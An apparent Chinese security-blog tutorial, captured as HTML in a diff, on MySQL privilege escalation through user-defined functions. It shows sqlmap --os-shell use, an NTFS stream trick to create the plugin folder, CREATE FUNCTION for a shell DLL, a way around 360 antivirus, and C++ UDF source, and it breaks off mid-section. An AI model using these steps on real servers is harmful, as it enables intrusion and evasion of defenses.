@@ -1,0 +1,1512 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="“要么忙着活，要么忙着死 。 ”  首发云众可信，博客备份">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小议Mysql提权">
+<meta property="og:url" content="https://lengjibo.github.io/mysqludf/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="“要么忙着活，要么忙着死 。 ”  首发云众可信，博客备份">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/6.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/7.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/8.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/9.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/10.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/11.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/12.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/13.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/14.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/15.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/16.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/17.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/18.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/19.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/20.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/mysqludf/21.png">
+<meta property="og:updated_time" content="2020-04-05T10:07:38.957Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="小议Mysql提权">
+<meta name="twitter:description" content="“要么忙着活，要么忙着死 。 ”  首发云众可信，博客备份">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/mysqludf/1.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/mysqludf/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>小议Mysql提权 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/mysqludf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">小议Mysql提权
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-04-02 14:43:05" itemprop="dateCreated datePublished" datetime="2020-04-02T14:43:05+08:00">2020-04-02</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2020-04-05 18:07:38" itemprop="dateModified" datetime="2020-04-05T18:07:38+08:00">2020-04-05</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Ｗeb安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>“要么忙着活，要么忙着死 。 ”</p>
+<hr>
+<p>首发云众可信，博客备份</p>
+<a id="more"></a>
+<p>本文将对mysql常见的提权方式进行讲解</p>
+<h2 id="mysql提权方式"><a href="#mysql提权方式" class="headerlink" title="mysql提权方式"></a>mysql提权方式</h2><p>mysql下常见的提权方法有：</p>
+<ol>
+<li>mof</li>
+<li>udf</li>
+<li>CVE-2016-6663</li>
+<li>CVE-2016-6664</li>
+</ol>
+<p>因为mof提权只针对低版本系统，故本文不做论述，只针对后面的三种进行简单介绍。</p>
+<h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h3 id="什么是udf："><a href="#什么是udf：" class="headerlink" title="什么是udf："></a>什么是udf：</h3><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
+<h3 id="提权原理："><a href="#提权原理：" class="headerlink" title="提权原理："></a>提权原理：</h3><p>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
+<p>ps:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</span><br><span class="line">如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</span><br></pre></td></tr></table></figure>
+<p>利用条件：</p>
+<p>​ （1）MySQL 数据库没有开启安全模式。</p>
+<p>​ （2）已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</p>
+<p>​ （3）shell 有写入到数据库安装目录的权限。</p>
+<p>　（4）windows2003、windowsXP、windows7</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h3><p>操作系统版本：windows 2003<br>数据库版本：5.5.53</p>
+<p><img src="../images/mysqludf/1.png" alt="image"></p>
+<h4 id="利用sqlmap进行UDF提权"><a href="#利用sqlmap进行UDF提权" class="headerlink" title="利用sqlmap进行UDF提权"></a>利用sqlmap进行UDF提权</h4><blockquote>
+<p>sqlmap.py -d “mysql://root:<a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a>:3306/mysql” –os-shell </p>
+</blockquote>
+<p><img src="../images/mysqludf/2.png" alt="image"></p>
+<p>如果提示：</p>
+<blockquote>
+<p>[CRITICAL] sqlmap requires ‘python-pymysql’ third-party library in order to directly connect to the DBMS ‘MySQL’. You can download it from ‘<a href="https://github.com/petehunt/PyMySQL/&#39;" target="_blank" rel="noopener">https://github.com/petehunt/PyMySQL/&#39;</a>. Alternative is to use a package ‘python-sqlalchemy’ with support for dialect ‘mysql’ installed</p>
+</blockquote>
+<p>是因为你缺少相应的库，安装即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/petehunt/PyMySQL/</span><br><span class="line"> cd PyMySQL/</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
+<p><img src="../images/mysqludf/3.png" alt="image"></p>
+<p>sqlmap内置的dll支持以下函数：</p>
+<p><img src="../images/mysqludf/4.png" alt="image"></p>
+<p>除了这些，其他有用的函数如下：</p>
+<p><img src="../images/mysqludf/5.png" alt="image"></p>
+<h4 id="利用msf进行UDF提权"><a href="#利用msf进行UDF提权" class="headerlink" title="利用msf进行UDF提权"></a>利用msf进行UDF提权</h4><p>mysql_udf_payload模块，适应于5.5.9以下。</p>
+<h4 id="手动提权"><a href="#手动提权" class="headerlink" title="手动提权"></a>手动提权</h4><p>大多数的大马目前都有这个功能了，我这里就用一个基础的大马来操作。</p>
+<p><img src="../images/mysqludf/6.png" alt="image"></p>
+<p>先导出dll，这里显示出错</p>
+<p><img src="../images/mysqludf/7.png" alt="image"></p>
+<p>错误码2，一般是没有plugin目录。可用流模式突破进而创建文件夹</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir;  </span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION'</span>;</span><br></pre></td></tr></table></figure>
+<p>大部分的马，已经集成了这类功能</p>
+<p><img src="../images/mysqludf/8.png" alt="image"></p>
+<p>然后我们只需将其导出即可。</p>
+<p><img src="../images/mysqludf/9.png" alt="image"></p>
+<p>然后创建函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> shell <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure>
+<p>执行查询</p>
+<p><img src="../images/mysqludf/10.png" alt="image"></p>
+<p>然后删除即可。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> shell; </span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'shell'</span></span><br></pre></td></tr></table></figure>
+<h4 id="bypass360"><a href="#bypass360" class="headerlink" title="bypass360"></a>bypass360</h4><p>360有时会拦截上传的马，将自己要提权的php脚本后缀修改为csproj 然后再通过包含文件即可绕过。</p>
+<p>在这之前，我们先看一下udf dll的逻辑，也就是怎么编写一个这种东西。</p>
+<p>首先定义主体：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLE g_module;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HINSTANCE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        g_module = hModule;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后下面是udf独有的代码结构：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function">my_bool <span class="title">open3389_init</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="keyword">char</span> *message)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="comment">//在open3389函数之前调用，一般用于初始化工作，为可选函数；  </span></span><br><span class="line"><span class="comment">//return 1出错 ,0 正常  </span></span><br><span class="line"> 　<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function"><span class="keyword">char</span> *<span class="title">open3389</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args,<span class="keyword">char</span> *result, <span class="keyword">unsigned</span> <span class="keyword">long</span> *length,<span class="keyword">char</span> *is_null, <span class="keyword">char</span> *error)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="comment">//真正实现功能的函数，必需函数；  </span></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">函数内容;  </span></span><br><span class="line"><span class="comment">return 结果;  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function"><span class="keyword">void</span> <span class="title">open3389_deinit</span><span class="params">(UDF_INIT *initid)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="comment">//在open3389函数之后调用，一般用于内存释放，可选函数；  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>大体上呢，就是这样。里面的就是套windows API就好了，注意里面的数据类型的转换。</p>
+<p>比如一个读注册表的函数就可以这样写：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function">my_bool <span class="title">regread_init</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="keyword">char</span> *message)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//return 1出错 ,0 正常  </span></span><br><span class="line"> 　initid-&gt;max_length=<span class="number">65</span>*<span class="number">1024</span>*<span class="number">1024</span>;  </span><br><span class="line"> 　<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function"><span class="keyword">char</span> *<span class="title">regread</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args,<span class="keyword">char</span> *result, <span class="keyword">unsigned</span> <span class="keyword">long</span> *length,<span class="keyword">char</span> *is_null, <span class="keyword">char</span> *error)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"> 　<span class="keyword">if</span>(args-&gt;arg_count!=<span class="number">3</span> || args-&gt;arg_type[<span class="number">0</span>]!=STRING_RESULT || args-&gt;arg_type[<span class="number">1</span>]!=STRING_RESULT || args-&gt;arg_type[<span class="number">2</span>]!=STRING_RESULT || stricmp(args-&gt;args[<span class="number">0</span>],<span class="string">"help"</span>)==<span class="number">0</span>)  </span><br><span class="line"> 　&#123;  </span><br><span class="line"> 　　　initid-&gt;ptr=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">250</span>);  </span><br><span class="line"> 　　　<span class="keyword">if</span>(initid-&gt;ptr==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">NULL</span>;  </span><br><span class="line"> 　　　<span class="built_in">strcpy</span>(initid-&gt;ptr,<span class="string">"读注册表函数.\r\n例:select regread(\"HKEY_LOCAL_MACHINE\",\"SYSTEM\\\\ControlSet001\\\\Services\\\\W3SVC\\\\Parameters\\\\Virtual Roots\",\"/\");\r\n参数中的\"\\\"要用\"\\\\\"代替."</span>);  </span><br><span class="line"> 　　　*length=<span class="built_in">strlen</span>(initid-&gt;ptr);  </span><br><span class="line"> 　　　<span class="keyword">return</span> initid-&gt;ptr;  </span><br><span class="line"> 　&#125;  </span><br><span class="line"> </span><br><span class="line"> 　DWORD a,b,c;  </span><br><span class="line"> 　BYTE bytere[<span class="number">1000</span>];  </span><br><span class="line"> 　HKEY key,key2;  </span><br><span class="line"> 　<span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"HKEY_LOCAL_MACHINE"</span>,(args-&gt;args)[<span class="number">0</span>])==<span class="number">0</span>)  </span><br><span class="line"> 　　　key=HKEY_LOCAL_MACHINE;  </span><br><span class="line"> 　<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"HKEY_CLASSES_ROOT"</span>,(args-&gt;args)[<span class="number">0</span>])==<span class="number">0</span>)  </span><br><span class="line"> 　　　key=HKEY_CLASSES_ROOT ;  </span><br><span class="line"> 　<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"HKEY_CURRENT_USER "</span>,(args-&gt;args)[<span class="number">0</span>])==<span class="number">0</span>)  </span><br><span class="line"> 　　　key=HKEY_CURRENT_USER ;  </span><br><span class="line"> 　<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"HKEY_USERS "</span>,(args-&gt;args)[<span class="number">0</span>])==<span class="number">0</span>)  </span><br><span class="line"> 　　　key=HKEY_USERS ; </span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line"> 　&#123;  </span><br><span class="line"> 　　　initid-&gt;ptr=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">50</span>+<span class="built_in">strlen</span>((args-&gt;args)[<span class="number">0</span>]));  </span><br><span class="line"> 　　　<span class="built_in">sprintf</span>(initid-&gt;ptr,<span class="string">"未知的注册表句柄:%s\r\n"</span>,(args-&gt;args)[<span class="number">0</span>]);  </span><br><span class="line"> 　　　*length=<span class="built_in">strlen</span>(initid-&gt;ptr);  </span><br><span class="line"> 　　　<span class="keyword">return</span> initid-&gt;ptr;  </span><br><span class="line"> 　&#125;  </span><br><span class="line"> 　  </span><br><span class="line"> </span><br><span class="line"> 　RegCreateKeyEx(key,(args-&gt;args)[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,REG_OPTION_NON_VOLATILE,KEY_QUERY_VALUE,<span class="literal">NULL</span>,&amp;key2,&amp;b);  </span><br><span class="line"> 　<span class="keyword">if</span>(b==REG_OPENED_EXISTING_KEY)  </span><br><span class="line"> 　&#123;  </span><br><span class="line"> 　　　<span class="keyword">if</span>(!RegQueryValueEx(key2,(args-&gt;args)[<span class="number">2</span>],<span class="number">0</span>,&amp;a,bytere,&amp;c))  </span><br><span class="line"> 　　　&#123;  </span><br><span class="line"> 　　　　　CloseHandle(key2);  </span><br><span class="line"> 　　　　　initid-&gt;ptr=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">1001</span>);  </span><br><span class="line"> 　　　　　<span class="built_in">memset</span>(initid-&gt;ptr,<span class="number">0</span>,<span class="number">1001</span>);  </span><br><span class="line"> 　　　　　<span class="built_in">strcpy</span>(initid-&gt;ptr,(<span class="keyword">char</span> *)bytere);  </span><br><span class="line"> 　　　　　*length=<span class="built_in">strlen</span>(initid-&gt;ptr);  </span><br><span class="line"> 　　　　　<span class="keyword">return</span> initid-&gt;ptr;  </span><br><span class="line"> 　　　&#125;  </span><br><span class="line"> 　　　<span class="keyword">else</span>  </span><br><span class="line"> 　　　&#123;  </span><br><span class="line"> 　　　　　CloseHandle(key2);  </span><br><span class="line"> 　　　　　initid-&gt;ptr=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);  </span><br><span class="line"> 　　　　　<span class="built_in">strcpy</span>(initid-&gt;ptr,<span class="string">"找不注册表值\r\n"</span>);  </span><br><span class="line"> 　　　　　*length=<span class="built_in">strlen</span>(initid-&gt;ptr);  </span><br><span class="line"> 　　　　　<span class="keyword">return</span> initid-&gt;ptr;  </span><br><span class="line"> 　　　&#125;  </span><br><span class="line"> 　&#125;  </span><br><span class="line"> 　<span class="keyword">else</span>  </span><br><span class="line"> 　&#123;  </span><br><span class="line"> 　　　CloseHandle(key2);  </span><br><span class="line"> 　　　initid-&gt;ptr=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);  </span><br><span class="line"> 　　　<span class="built_in">strcpy</span>(initid-&gt;ptr,<span class="string">"找不注册表项\r\n"</span>);  </span><br><span class="line"> 　　　*length=<span class="built_in">strlen</span>(initid-&gt;ptr);  </span><br><span class="line"> 　　　<span class="keyword">return</span> initid-&gt;ptr;  </span><br><span class="line"> 　&#125;  </span><br><span class="line"> </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> __declspec(dllexport)<span class="function"><span class="keyword">void</span> <span class="title">regread_deinit</span><span class="params">(UDF_INIT *initid)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"> 　<span class="keyword">if</span>(initid-&gt;ptr)  </span><br><span class="line"> 　　　<span class="built_in">free</span>(initid-&gt;ptr);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>比如，我们定义一个开进程的函数，本人vs坏掉了，就直接那包子师傅的代码过来了：</p>
